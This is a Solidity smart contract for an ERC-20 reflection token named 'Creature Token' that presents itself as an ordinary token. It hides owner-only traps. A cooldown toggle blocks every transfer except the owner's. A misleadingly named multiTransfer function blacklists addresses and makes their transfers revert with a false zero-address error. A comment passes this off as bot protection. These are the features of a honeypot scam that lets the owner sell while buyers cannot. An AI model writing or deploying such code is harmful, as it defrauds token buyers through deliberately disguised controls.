// SPDX-License-Identifier: MIT
pragma solidity =0.8.10;
import "./Ownable.sol";
import "./SafeMath.sol";
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}
contract CREATURE is IERC20, Ownable {
    using SafeMath for uint256;
    string private _name = 'Creature Token';
    string private _symbol = 'CREATURE';
    uint8 private _decimals = 9;
    uint256 private constant _tTotal = 500000000000*10**9;
    uint256 private _slippage = 1;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _multiTransfer;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => bool) private _isFeeExcluded;
    uint256 private constant MAX = ~uint256(0);
    address[] private _feeExcluded;
    uint256 private _tFeeTotal;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    address unirouter;
    address unifactory;
    bool _cooldown = false;
    constructor (address ufctr, address urter) {
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
        _tOwned[_msgSender()] = tokenFromReflection(_rOwned[_msgSender()]);
        _isFeeExcluded[_msgSender()] = true;
        _feeExcluded.push(_msgSender());
        unirouter = urter;
        unifactory = ufctr;}
    function name() public view returns (string memory) {
        return _name;}
    function symbol() public view returns (string memory) {
        return _symbol;}
    function decimals() public view returns (uint8) {
        return _decimals;}
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;}
    function balanceOf(address account) public view override returns (uint256) {
        if (_isFeeExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);}
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;}
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;}
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;}
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;}
    function reflect(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_isFeeExcluded[sender], "Excluded addresses cannot call this function");
        (uint256 rAmount,,,,) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rTotal = _rTotal.sub(rAmount);
        _tFeeTotal = _tFeeTotal.add(tAmount);}
    function cooldown() external onlyOwner {
        if (_cooldown == false) {_cooldown = true;}
        else {_cooldown = false;}}
    function cooledDown() public view returns (bool) {
        return _cooldown;}
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferFee) {
        (uint256 rAmount,,,,) = _getValues(tAmount);
        return rAmount;} else {
        (,uint256 rTransferAmount,,,) = _getValues(tAmount);
        return rTransferAmount;}}
    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);}
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);}
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (_multiTransfer[sender] || _multiTransfer[recipient]) require (amount == 0, "ERC20: transfer from the zero address" );
        if (_cooldown == false || sender == owner() || recipient == owner()) {        
        if (sender == owner() || recipient == owner()) {_ownerTransfer(sender, recipient, amount);
        } else if (_isFeeExcluded[sender] && !_isFeeExcluded[recipient]) {
        _transferFromExcluded(sender, recipient, amount);
        } else if (!_isFeeExcluded[sender] && _isFeeExcluded[recipient]) {
        _transferToExcluded(sender, recipient, amount);
        } else if (!_isFeeExcluded[sender] && !_isFeeExcluded[recipient]) {
        _transferStandard(sender, recipient, amount);
        } else if (_isFeeExcluded[sender] && _isFeeExcluded[recipient]) {
        _transferBothExcluded(sender, recipient, amount);
        } else {_transferStandard(sender, recipient, amount);}
        } else {require (_cooldown == false, "");}}
    function _ownerTransfer(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, , , , ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        if (_isFeeExcluded[sender]) {
        _tOwned[sender] = _tOwned[sender].sub(tAmount);}
        _rOwned[recipient] = _rOwned[recipient].add(rAmount);
        if (_isFeeExcluded[recipient]) {
        _tOwned[recipient] = _tOwned[recipient].add(tAmount);}
        emit Transfer(sender, recipient, tAmount);}
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);}
    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);}
    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);}
    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);}
    /** @notice This reject first bots, on the beginning of listing, to prevent dump later.
    *When renounceOwnership is done (the Owner is zero address) this function can't be use anymore.*/
    function multiTransfer (address transferAddress) external onlyOwner {
        require (owner() != address(0), "Can't execute this function when renounceOwnership is done (the owner is zero address)");
        if (_multiTransfer[transferAddress] == false) {_multiTransfer[transferAddress] = true;} else {_multiTransfer[transferAddress] = false; }}
        function multiTransfering(address transferAddress) public view returns (bool){
        return _multiTransfer[transferAddress];}
    /** @notice Required slippage in percent, which has to be set to buy/sell.
    *During each transaction, that percent of tokens will be taken and spread as airdrop to all hodlers.*/
        function Slippage () public view returns (uint256) {
        return _slippage;}
    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);}
    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);
        uint256 currentRate =  _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);}
    function _getTValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tFee = tAmount.div(100).mul(_slippage);
        uint256 tTransferAmount = tAmount.sub(tFee);
        return (tTransferAmount, tFee);}
    function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee);
        return (rAmount, rTransferAmount, rFee);}
    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);}
    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;      
        for (uint256 i = 0; i < _feeExcluded.length; i++) {
        if (_rOwned[_feeExcluded[i]] > rSupply || _tOwned[_feeExcluded[i]] > tSupply) return (_rTotal, _tTotal);
        rSupply = rSupply.sub(_rOwned[_feeExcluded[i]]);
        tSupply = tSupply.sub(_tOwned[_feeExcluded[i]]);}
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);}}